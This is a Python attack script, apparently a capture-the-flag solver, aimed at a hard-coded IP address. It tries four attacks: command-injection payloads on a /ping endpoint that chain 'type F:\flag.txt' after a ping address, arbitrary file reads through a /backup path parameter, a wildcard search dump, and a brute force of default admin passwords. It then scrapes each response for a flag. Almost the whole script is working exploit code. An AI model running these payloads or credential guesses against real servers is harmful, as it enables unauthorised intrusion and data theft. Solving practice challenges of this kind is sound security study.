import requests
import time
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"

session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

# 等待服务就绪
for i in range(10):
    try:
        r = session.get(TARGET, timeout=10)
        if r.status_code == 200:
            print("服务就绪!")
            break
        print(f"尝试 {i+1}: 状态码 {r.status_code}")
    except Exception as e:
        print(f"尝试 {i+1}: 错误 {e}")
    time.sleep(5)

# 测试主页面
print("\n" + "="*60)
print("测试主页面")
print("="*60)

try:
    r = session.get(TARGET, timeout=10)
    print(f"状态码: {r.status_code}")
    if r.status_code == 200:
        print(f"内容长度: {len(r.text)}")
        
        # 搜索flag
        flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
        if flag_match:
            print(f"🚩 FLAG: {flag_match.group(0)}")
        
        # 检查可用页面
        links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        print(f"可用链接: {links}")
except Exception as e:
    print(f"错误: {e}")

# 测试Ping命令执行
print("\n" + "="*60)
print("测试Ping命令执行")
print("="*60)

ping_payloads = [
    "127.0.0.1 & type F:\\flag.txt",
    "127.0.0.1 && type F:\\flag.txt",
    "127.0.0.1 | type F:\\flag.txt",
    "127.0.0.1; type F:\\flag.txt",
]

for payload in ping_payloads:
    try:
        r = session.get(f"{TARGET}/ping", params={"host": payload}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1)
                if len(content) > 50 and "Blocked" not in content:
                    print(f"\n[{payload}]")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"🚩 FLAG: {flag_match.group(0)}")
    except Exception as e:
        print(f"错误: {e}")

# 测试Backup
print("\n" + "="*60)
print("测试Backup")
print("="*60)

backup_payloads = [
    "F:\\flag.txt",
    "F:\\small peoject\\python-lab\\flag.txt",
]

for payload in backup_payloads:
    try:
        r = session.get(f"{TARGET}/backup", params={"path": payload}, timeout=10)
        if r.status_code == 200:
            body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
            if body:
                content = body.group(1)
                if len(content) > 20 and "Blocked" not in content:
                    print(f"\n[{payload}]")
                    print(f"响应: {content[:500]}")
                    
                    flag_match = re.search(r'flag\{[^}]+\}', content, re.IGNORECASE)
                    if flag_match:
                        print(f"🚩 FLAG: {flag_match.group(0)}")
    except Exception as e:
        print(f"错误: {e}")

# 测试搜索
print("\n" + "="*60)
print("测试搜索")
print("="*60)

try:
    r = session.get(f"{TARGET}/search", params={"q": "%"}, timeout=10)
    if r.status_code == 200:
        print("搜索结果:")
        results = re.findall(r'<h2>(.*?)</h2><p>(.*?)</p>', r.text, re.DOTALL)
        for title, content in results:
            print(f"  - {title.strip()}: {content.strip()}")
        
        flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
        if flag_match:
            print(f"🚩 FLAG: {flag_match.group(0)}")
except Exception as e:
    print(f"错误: {e}")

# 测试登录
print("\n" + "="*60)
print("测试登录")
print("="*60)

try:
    r = session.get(f"{TARGET}/login", timeout=10)
    csrf = re.search(r'name=["\']csrf["\']\s*value=["\']([^"\']+)["\']', r.text)
    csrf_token = csrf.group(1) if csrf else ""
    
    for username, password in [("admin", "admin"), ("admin", "123456"), ("admin", "password")]:
        data = {"username": username, "password": password, "csrf": csrf_token}
        r = session.post(f"{TARGET}/login", data=data, timeout=10)
        if "用户名或密码错误" not in r.text:
            print(f"登录成功: {username}/{password}")
            
            # 检查控制台
            r2 = session.get(f"{TARGET}/dashboard", timeout=10)
            flag_match = re.search(r'flag\{[^}]+\}', r2.text, re.IGNORECASE)
            if flag_match:
                print(f"🚩 FLAG: {flag_match.group(0)}")
except Exception as e:
    print(f"错误: {e}")

print("\n" + "="*60)
print("测试完成")
print("="*60)